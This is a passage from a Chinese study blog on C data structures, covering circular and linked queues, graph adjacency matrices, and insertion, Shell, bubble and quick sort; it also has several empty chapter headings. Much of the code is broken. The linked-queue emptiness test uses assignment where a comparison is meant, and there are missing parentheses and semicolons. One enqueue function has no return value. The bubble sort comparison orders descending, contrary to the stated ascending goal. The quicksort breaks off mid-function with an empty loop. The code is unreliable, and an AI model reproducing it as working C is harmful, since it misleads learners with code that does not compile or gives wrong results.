<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">StackElementType <span class="title">GetTop</span><span class="params">(LinkStack *top)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> top?top-&gt;data:<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="队列的定义"><a href="#队列的定义" class="headerlink" title="队列的定义"></a>队列的定义</h3><ul>
<li>队列(Queue)是一种只允许在一端进行插入,另一端进行删除的运算受限的线性表,允许删除的一端叫队头(front),允许插入的一端叫队尾(rear).</li>
<li>队列的插入操作通常称为入队,删除操作通常称为出队,当队列中没有元素时称为空队列.</li>
<li>队列具有”先进先出”(FIFO)特性,简称为FIFO表.</li>
</ul>
<h4 id="队列的存储结构"><a href="#队列的存储结构" class="headerlink" title="队列的存储结构"></a>队列的存储结构</h4><h5 id="循环队列-顺序队列"><a href="#循环队列-顺序队列" class="headerlink" title="循环队列(顺序队列)"></a>循环队列(顺序队列)</h5><p>在顺序队列中,进行入队和出队操作时可能产生溢出现象:</p>
<p>1.”下溢”现象</p>
<p>当队列为空时,进行出队运算产生的溢出现象,称为”下溢”.可通过判断队列是否为空来控制</p>
<p>2.”真上溢”现象</p>
<p>当队列满时,进行入队运算时产生空间溢出的现象,称为”真上溢”.可通过判断队列是否满来控制</p>
<p>3.”假上溢”现象</p>
<p>由于在入队和出队操作中,队头指针与队尾指针只增加不减小,致使被删元素的空间永远无法重新利用.当队列中实际的元素个数远远小于存储空间的规模时,也可能由于队尾指针已超越队列空间的上界而不能做入队操作.这种现象称为”假下溢”.</p>
<p>为防止假溢出现象发生,充分利用存储空间,最巧妙的解决方法就是把队列存储空间看作首尾相连的环,而这种队列的循环顺序存储结构称为循环队列.</p>
<p>循环队列存储结构</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxSize 100;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> QueueElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    QueueElementType *base;<span class="comment">//base指向队列存储区首地址</span></span><br><span class="line">    <span class="keyword">int</span> front;</span><br><span class="line">    <span class="keyword">int</span> rear;</span><br><span class="line">&#125;SeqQueue;</span><br></pre></td></tr></table></figure>
<p>循环队列的特点</p>
<ul>
<li>队头,队尾指针加1时从MaxSize-1直接进到0,这种变化可用C语言的取模(余数)运算实现</li>
<li>队空与队满时头尾指针均相等,无法通过front==rear来判断队列的”空”和”满”,解决此问题有两种方法:<ol>
<li>另设一个状态标志位来区别”队空”和”队满”</li>
<li>少用一个存储空间,约定以队头指针在队尾指针的下一位置上作为队列满的标志</li>
</ol>
</li>
</ul>
<p>采用第二种处理方法:</p>
<p>循环队列空的标志:front==rear</p>
<p>循环队列满的标志:(rear+1)%MaxSize==front</p>
<p>循环队列初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SeqQueue <span class="title">InitQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SeqQueue Q;</span><br><span class="line">    Q.base=(QueueElementType*)<span class="built_in">malloc</span>(MaxSize*<span class="keyword">sizeof</span>(QueueElementType));</span><br><span class="line">    <span class="keyword">if</span>(!Q.base)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;申请存储空间失败,程序运行终止!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.front=<span class="number">0</span>;</span><br><span class="line">    Q.rear=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断循环队列为空</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueEmpty</span><span class="params">(SeqQueue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (Q.front==Q.rear)?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断循环队列为满</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueFull</span><span class="params">(SeqQueue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (Q.front==(Q.rear+<span class="number">1</span>)%MaxSize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>入队操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SeqQueue <span class="title">EnQUeue</span><span class="params">(SeqQueue Q,QueueElementType x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(QueueFull(Q)</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;队满!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        *(Q.base+Q.rear)=x;</span><br><span class="line">        Q.rear=(Q.rear+<span class="number">1</span>)%MaxSize;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> Q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>出队操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SeqQueue <span class="title">DeQueue</span><span class="params">(SeqQueue Q,QueueElementType *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(QueueEmpty(Q))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队空!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        *e=*(Q.base+Q.front);</span><br><span class="line">        Q.front=(Q.front+<span class="number">1</span>)%MaxSize;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读取队头元素</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">QueueElementType <span class="title">GetHead</span><span class="params">(SeqQueue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(QueueEmpty(Q))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队空!读取失败!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> *(Q.base+Q.front);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>销毁队列</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryQueue</span><span class="params">(SeqQueue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(Q.base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;队列已被销毁!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>队列遍历操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QueueDisplay</span><span class="params">(SeqQueue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(QueueEmpty(Q))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队空!队列遍历完成!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队列遍历(队头-&gt;队尾):\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Q.front;i!=Q.rear;i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;&quot;</span>,*(Q.base+i));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\b\b \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="链式队列"><a href="#链式队列" class="headerlink" title="链式队列"></a>链式队列</h5><p>一个链式队列由一个头指针和一个尾指针唯一地确定.</p>
<p>链式队列节点类型定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> QueueElementType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    QueueElementType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;QueueNode;</span><br></pre></td></tr></table></figure>
<p>链式队列数据类型定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    QueueNode *front;</span><br><span class="line">    QueueNode *rear;</span><br><span class="line">&#125;LinkQueue;</span><br></pre></td></tr></table></figure>
<p>链式队列的初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkQueue <span class="title">InitQueue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LinkQueue Q;</span><br><span class="line">    QueueNode *p;</span><br><span class="line">    p=(QueueNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QueueNode));</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        Q.front=Q.rear=p;</span><br><span class="line">        Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> Q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;初始化失败!程序运行终止!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断链式队列是否为空</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueEmpty</span><span class="params">(LinkQueue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (Q.front=Q.rear)?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>入队操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkQueue <span class="title">EnQueue</span><span class="params">(LinkQueue Q,QueueElementType x)</span></span>&#123;</span><br><span class="line">    QueueNode *p;</span><br><span class="line">    p=(QueueNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QueueNode));</span><br><span class="line">    <span class="keyword">if</span>(!p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;申请空间失败!程序运行终止!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        p-&gt;data=x;</span><br><span class="line">        p-&gt;next=<span class="literal">NULL</span>;<span class="comment">//尾节点的next置空</span></span><br><span class="line">        Q.rear-&gt;next=p;</span><br><span class="line">        Q.rear=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>出队操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">LinkQueue <span class="title">DeQueue</span><span class="params">(LinkQueue Q,QueueELementType *e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QueueNode *p;</span><br><span class="line">    <span class="keyword">if</span>(QueueEmpty(Q))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;队列为空!出队失败!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        p=Q.front-&gt;next;</span><br><span class="line">        *e=p-&gt;data;</span><br><span class="line">        Q.front-&gt;next=p-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">            Q.rear=Q.front;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读取队头操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">QueueElementType <span class="title">GetHead</span><span class="params">(LinkQueue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(QueueEmpty(Q))</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;队列为空!读取队头失败!\n&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> (Q.front-&gt;next.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="四-矩阵的压缩存储"><a href="#四-矩阵的压缩存储" class="headerlink" title="四.矩阵的压缩存储"></a>四.矩阵的压缩存储</h2><h2 id="五-递归"><a href="#五-递归" class="headerlink" title="五.递归"></a>五.递归</h2><h2 id="六-树与二叉树"><a href="#六-树与二叉树" class="headerlink" title="六.树与二叉树"></a>六.树与二叉树</h2><h2 id="七-图"><a href="#七-图" class="headerlink" title="七.图"></a>七.图</h2><p>图形结构是一种比树形结构更复杂的非线性结构.在树形结构中,节点间具有分支层次关系,每一层上的节点只能和上一层中的至多一个节点相关,但可能和下一层的多个节点相关.而在图形结构中,任意两个节点之间都可能相关,即节点之间的邻接关系可以是任意的.</p>
<h3 id="图及其相关概念"><a href="#图及其相关概念" class="headerlink" title="图及其相关概念"></a>图及其相关概念</h3><ul>
<li>图是由顶点(vertex)集合及顶点间的关系组成的一种数据结构.</li>
<li>图分为无向图和有向图.具有n个顶点,n(n-1)/2条边的无向图,称为完全无向图.具有n个顶点,n(n-1)条弧的有向图称为完全有向图.完全无向图和完全有向图统称为完全图.</li>
<li>当一个图接近完全图时,称它为稠密图.相反称为稀疏图.</li>
<li>与边有关的数据信息称为权.带权图又称为网络.如果边是有方向的带权图,则是一个有向网络.</li>
<li>在无向图中,一个顶点依附的边的数目称为该顶点的度.在有向图中,指向顶点的弧的数目称为该顶点的入度(这种弧也称为入弧).从顶点发出的弧的数目称为该顶点的出度.有向图的某个顶点的入度和出度之和称为该顶点的度.</li>
<li>除第一个顶点与最后一个顶点之外,其它顶点不重复出现的回路称为简单回路(简单环).</li>
<li>若G中任意两个顶点都是连通的,则称G为连通图,否则称为非连通图.</li>
</ul>
<h3 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h3><h4 id="邻接矩阵表示法"><a href="#邻接矩阵表示法" class="headerlink" title="邻接矩阵表示法"></a>邻接矩阵表示法</h4><p>在图的邻接矩阵表示中,除用一个一维数组存放顶点本身的信息外,还用一个n×n的矩阵表示各个顶点之间的邻接关系.即若(i,j)或<i,j>属于边集E,则矩阵中第i行,第j列元素值为1,否则为0.</p>
<p>从无向图的邻接矩阵存储方法可以看出:</p>
<ol>
<li>无向图的邻接矩阵一定是一个对称矩阵</li>
<li>第i行或第i列中1的个数是顶点i的度</li>
<li>矩阵中1的个数的一半为图中边的数目</li>
</ol>
<p>从有向图的邻接矩阵存储方法可以看出:</p>
<ol>
<li>有向图的邻接矩阵不一定是一个对称矩阵</li>
<li>第i行中1的个数为顶点i的出度</li>
<li>第i列中1的个数为顶点i的入度</li>
<li>矩阵中1的个数为图中弧的数目</li>
</ol>
<p>从无向网络的邻接矩阵存储方法可以看出:</p>
<ol>
<li>无向网络的邻接矩阵一定是一个对称矩阵</li>
<li>第i行或第i列中非∞元素的个数为顶点i的度</li>
<li>矩阵中非∞元素的个数的一半为网络中边的数目</li>
</ol>
<p>从有向网络的邻接矩阵存储方法可以看出:</p>
<ol>
<li>有向网络的邻接矩阵不一定是一个对称矩阵</li>
<li>第i行中非∞元素的个数为顶点i的出度</li>
<li>第i列中非∞元素的个数为顶点i的入度</li>
<li>矩阵中非∞元素的个数为网络中弧的数目</li>
</ol>
<p>邻接矩阵的存储结构:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INFINITY 65535 <span class="comment">//用65535表示∞</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVEX 100 <span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> VertexType;<span class="comment">//顶点类型由用户定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> EdgeType;<span class="comment">//边上的权值类型由用户定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    VertexType vexs[MAXVEX];<span class="comment">//顶点表</span></span><br><span class="line">    EdgeType arc[MAXVEX][MAXVEX];<span class="comment">//邻接矩阵,可看作边表</span></span><br><span class="line">    <span class="keyword">int</span> numVertexs,numEdges;<span class="comment">//图中当前的顶点和边数</span></span><br><span class="line">&#125;Mgraph;</span><br></pre></td></tr></table></figure>
<p>无向网图的邻接矩阵表示:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreatMGraph</span><span class="params">(MGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入顶点数和边数:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d&quot;</span>,&amp;G-&gt;numVertexs,&amp;G-&gt;numEdges);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G-&gt;numVertexs;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(&amp;G-&gt;vexs[i]);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G-&gt;numVertexs;i++)</span><br><span class="line">        <span class="keyword">for</span>(j<span class="number">-0</span>;j&lt;G-&gt;numVertexs;j++)</span><br><span class="line">            G-&gt;arc[i][j]=INFINITY;<span class="comment">//邻接矩阵初始化</span></span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G-&gt;numEdges;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;输入边(vi,vj)上的下标i,下标j和权w:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">        G-&gt;arc[i][j]=w;</span><br><span class="line">        G-&gt;arc[j][i]=G-&gt;arc[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="邻接表表示法"><a href="#邻接表表示法" class="headerlink" title="邻接表表示法"></a>邻接表表示法</h4><h2 id="八-查找"><a href="#八-查找" class="headerlink" title="八.查找"></a>八.查找</h2><h2 id="九-排序"><a href="#九-排序" class="headerlink" title="九.排序"></a>九.排序</h2><h3 id="排序的概念"><a href="#排序的概念" class="headerlink" title="排序的概念"></a>排序的概念</h3><p>排序(Sorting)就是按照某种规则,将一组数据对象(记录)排列次序,其主要目的是提高数据检索的效率.</p>
<h3 id="排序的分类"><a href="#排序的分类" class="headerlink" title="排序的分类"></a>排序的分类</h3><p>按照排序过程中所使用存储器情况,可将排序方法分为两大类:</p>
<p>1.内部排序</p>
<p>在排序过程中,整个待排序列都是存放于内存中进行处理,无内外存储器之间的数据交换问题.内部排序速度快,适合少量数据的排序处理.</p>
<p>2.外部排序</p>
<p>在排序过程中,由于待排序记录数据量相当大,不可能也不允许全部驻留在内存中,而必须存放在外部存储器上,然后根据排序过程中的要求,不断在内外存之间进行数据交换来完成排序工作.外部排序速度慢,适合大量数据的排序问处理.</p>
<p>内部排序的方法较多,按照实现策略的不同,可以将内部排序分五大类.</p>
<ol>
<li>插入排序.直接插入排序,希尔排序.</li>
<li>交换排序.冒泡排序,快速排序.</li>
<li>选择排序.直接选择排序,堆排序.</li>
<li>归并排序.</li>
<li>基数排序.</li>
</ol>
<p>假设待排序序列中记录的数据类型定义如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key;</span><br><span class="line">    ElementType otherinfo;<span class="comment">//排序记录中的其他所有数据项</span></span><br><span class="line">&#125;RecordType;</span><br><span class="line"><span class="keyword">typedef</span> RecordType SeqList[MaxSize+<span class="number">1</span>];</span><br></pre></td></tr></table></figure>
<p>数组的第0个元素既可以用来作暂存空间使用,也可以作”监测哨兵”使用,但不用其存放待排序记录.在本章均要求排成递增序.</p>
<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h4><p>思想:</p>
<p>1.将待排序序列分为有序区和无序区,初始时,有序区为[R1],无序区为[R2…Rn],令i指向无序区第一个元素,初值i=2</p>
<p>2.当i&lt;=n时,重复执行:将当前无序区第一个记录插入到有序区合适位置</p>
<p>3.当i&gt;n时,排序结束</p>
<p>算法:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InsertSort</span><span class="params">(SeqList R,<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//length为待排序列长度</span></span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(R[i].key&lt;R[i<span class="number">-1</span>].key)</span><br><span class="line">        &#123;</span><br><span class="line">            R[<span class="number">0</span>]=R[i];</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-1</span>;R[<span class="number">0</span>].key&lt;R[j].key;j--)</span><br><span class="line">                R[j+<span class="number">1</span>]=R[j];<span class="comment">//记录后移</span></span><br><span class="line">            R[j+<span class="number">1</span>]=R[<span class="number">0</span>];</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>哨兵的作用:</p>
<p>1.进入查找(插入位置)循环之前,它保存了R[i]的副本,使不至于记录后移而丢失R[i]的内容.</p>
<p>2.在查找循环中”监视”下标j是否越界.</p>
<p>直接插入排序的时间复杂度为O(n^2),空间复杂度为O(1),直接插入排序是稳定的</p>
<h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><p>希尔排序也叫缩小增量排序,是插入排序的一种,在时间复杂度上比直接插入排序好.</p>
<p>思想:</p>
<p>1.先将整个待排序列以d1(d1&lt;n)为步长分成若干子序列,把所有相隔为d1的记录放在同一组</p>
<p>2.在每个分组内进行直接插入排序</p>
<p>3.再将整个待排序记录以d2(d2&lt;d1&lt;n)为步长重新分组,并在每组内进行直接插入排序</p>
<p>4.重复上步,直至dt=1,即所有记录放进一个组中进行直接插入排序,其最终结果为有序序列</p>
<p>算法:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellPass</span><span class="params">(SeqList R,<span class="keyword">int</span> length,<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//希尔排序的一次排序,length为待排序列长度,d为当前增量</span></span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=d+<span class="number">1</span>;i&lt;length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(R[i].key&lt;R[i-d].key)&#123;</span><br><span class="line">            R[<span class="number">0</span>]=R[i];</span><br><span class="line">            j=i-d;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                R[j+d]=R[j];</span><br><span class="line">                j=j-d;</span><br><span class="line">            &#125;<span class="keyword">while</span>(j&gt;<span class="number">0</span>&amp;&amp;R[<span class="number">0</span>].key&lt;R[j].key)</span><br><span class="line">                R[j+d]=R[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellSort</span><span class="params">(SeqList R,<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//对序列R进行希尔排序,length为待排序长度</span></span><br><span class="line">    <span class="keyword">int</span> increment=length;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        increment=(increment+<span class="number">1</span>)/<span class="number">3</span>;</span><br><span class="line">        ShellPass(R,length,increment);</span><br><span class="line">    &#125;<span class="keyword">while</span>(increment&gt;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>希尔排序时间复杂度可达到O(n^1.25),空间复杂度为O(1),希尔排序不稳定</p>
<h3 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h3><p>交换排序的基本思想是两两比较待排序记录的关键字,如果发现两个关键字逆序,则将两个记录位置互换,重复此过程,直到该系列所有关键字都有序为止.</p>
<h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><p>思想:</p>
<p>1.将第一个记录的关键字与第二个记录的关键字比较,若二者为逆序(R[1].key&gt;R[2].key),则交换两记录位置,然后比较第二个记录与第三个记录,若两关键字为逆序,同样交换位置</p>
<p>2.依次类推,直至第n-1个记录与第n个记录比较完为止.上述过程称为第一趟冒泡排序,其结果使n个记录中关键字最大的记录被移动到最后一个位置</p>
<p>3.然后进行第二次冒泡排序,即对前n-1个记录重复与第一趟冒泡排序类似的过程,结果使关键字次大的记录被移到第n-1个记录位置</p>
<p>4.重复上述过程,直到”在一趟排序过程中没有进行交换记录的操作”为止</p>
<p>算法:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BubbleSort</span><span class="params">(SeqList R,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,exchange=<span class="number">1</span>;<span class="comment">//exchange为发生交换的标志</span></span><br><span class="line">    <span class="keyword">for</span>(i=length;i&gt;<span class="number">1</span>&amp;&amp;exchange;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        exchange=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(R[j].key&lt;R[j+<span class="number">1</span>].key)</span><br><span class="line">            &#123;</span><br><span class="line">                R[<span class="number">0</span>]=R[j];</span><br><span class="line">                R[j]=R[j+<span class="number">1</span>];</span><br><span class="line">                R[j+<span class="number">1</span>]=R[<span class="number">0</span>];</span><br><span class="line">                exchange=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>冒泡排序时间复杂度为O(n²),空间复杂度为O(1),且冒泡排序是稳定的</p>
<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p>快速排序采用一种分治的策略,通常称为分治法.分治的基本思想是:将原问题分解为若干规模更小但将结构与原问题相似的子问题,采用递归方法求解这些子问题,然后将这些子问题的解组合成原问题的解.</p>
<p>思想:</p>
<p>1.从待排序列中任取一个记录(例如)的关键字作为枢轴(pivot),按照枢轴,将整个待排序列划分为左右两个子序列,其中左子序列中所有关键字都小于等于枢轴,而右子序列中所有的关键字都大于枢轴,枢轴记录则排在这两个子序列中间(这也是该记录的最终位置).此过程称为一趟快速排序(或一次划分).</p>
<p>2.对左右两个子序列分别重复实施上述方法,直到所有的记录都排在相应的位置上为止(每个子序列只含一个记录)</p>
<p>算法:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QuickPass</span><span class="params">(SeqList R,<span class="keyword">int</span> b,<span class="keyword">int</span> e)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//对R[b],...R[e]作一趟划分,并返回枢轴记录的位置</span></span><br><span class="line">    <span class="keyword">int</span> i=b,j=e;</span><br><span class="line">    R[<span class="number">0</span>]=R[i];</span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        <span class="keyword">while</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux C编程</title>
    <url>/article/34877.html</url>
